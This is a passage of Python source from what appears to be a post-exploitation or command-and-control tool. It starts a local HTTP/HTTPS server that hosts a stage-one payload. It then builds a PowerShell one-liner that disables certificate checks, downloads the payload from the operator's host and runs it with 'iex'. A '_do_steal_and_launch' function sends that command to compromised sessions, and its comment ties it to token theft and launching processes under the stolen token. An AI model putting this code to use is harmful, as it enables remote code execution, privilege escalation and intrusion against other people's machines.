                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(stage1.encode())
            else:
                self.send_response(404)
                self.end_headers()
        def log_message(self, *args):
            return

    # start HTTP or HTTPS server
    if opts.serve_https:
        # HTTPS: wrap socket with TLS context
        httpd = HTTPServer(('0.0.0.0', opts.http_port), _H)
        ctx  = tcp_listener.generate_tls_context(opts.local_host)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

    else:
        httpd = HTTPServer(('0.0.0.0', opts.http_port), _H)

    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()

    
    ps_cmd = (
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;"
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
        "$wc = New-Object Net.WebClient;"
        "$wc.Proxy = [Net.GlobalProxySelection]::GetEmptyWebProxy();"
        f"$s = $wc.DownloadString('{prefix}://{opts.local_host}:{opts.http_port}/winprcrpu');"
        "iex $s"
        )
    
    
    try:
        result = _do_steal_and_launch(sid, opts.pid, ps_cmd)
        page_count = 2
        

        return result

    finally:
        if page_count == 2:
            httpd.shutdown() 
            httpd.server_close()
            server_thread.join()
            page_count = 0

        else:
            pass


def _do_steal_and_launch(sid, pid, ps_payload):
    # P/Invoke snippet for token steal + CreateProcessWithTokenW
    sess = session_manager.sessions[sid]
    if sess.transport in ('http','https'):
        return shell.run_command_http(sid, ps_payload)

    elif sess.transport in ("tcp", "tls"):
        return shell.run_command_tcp(sid, ps_payload, timeout=0.5)

    else:
        return brightred + f"[!] Unsupported session type!"